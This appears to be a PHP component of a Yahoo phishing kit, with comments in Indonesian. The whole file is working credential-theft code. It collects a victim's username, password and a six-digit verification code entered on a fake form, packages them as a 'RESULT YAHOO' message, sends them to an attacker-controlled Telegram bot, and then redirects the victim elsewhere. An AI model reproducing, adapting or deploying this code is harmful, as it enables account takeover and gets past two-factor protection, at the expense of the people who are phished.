<?php
include "../telegram.php";
session_start();

/* Ambil session */
$uname = $_SESSION['uname'] ?? '-';
$passs = $_SESSION['pass'] ?? '-';

/* Gabungkan OTP */
$otp = '';
for ($i = 1; $i <= 6; $i++) {
    $otp .= $_POST["otp$i"] ?? '';
}

/* Bungkus HTML */
$uname = "<code>$uname</code>";
$passs = "<code>$passs</code>";
$code  = "<code>$otp</code>";

/* Pesan */
$message = "
<b>( RESULT YAHOO 2025 🔥 )</b>

- Username : $uname
- Password : $passs
- Kode Verifikasi : $code
";

/* Fungsi kirim */
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot{$id_botTele}/sendMessage";
    $data = [
        'chat_id' => $id_telegram,
        'text' => $message,
        'parse_mode' => 'html'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

/* Kirim */
sendMessage($id_telegram, $message, $id_botTele);

/* Redirect */
header('Location: ../alert2.php');
exit;